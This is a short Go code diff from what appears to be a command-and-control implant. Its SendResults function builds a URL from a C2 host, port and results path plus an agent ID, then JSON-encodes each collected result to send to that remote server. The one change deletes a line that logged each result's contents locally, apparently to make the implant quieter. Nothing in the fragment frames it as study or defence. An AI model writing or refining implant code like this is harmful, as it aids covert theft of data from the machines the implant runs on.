@@ -147,7 +147,6 @@ func (i *thisImplant) SendResults() error {
 	reqURL := "http://" + i.C2Host + i.C2Port + i.C2ResultsURI + "?agent_id=" + i.Id.String()
 	for _, res := range *i.Results {
 		data, err := json.Marshal(res)
-		log.Println(res.Contents)
 		if err != nil {
 			return err
 		}
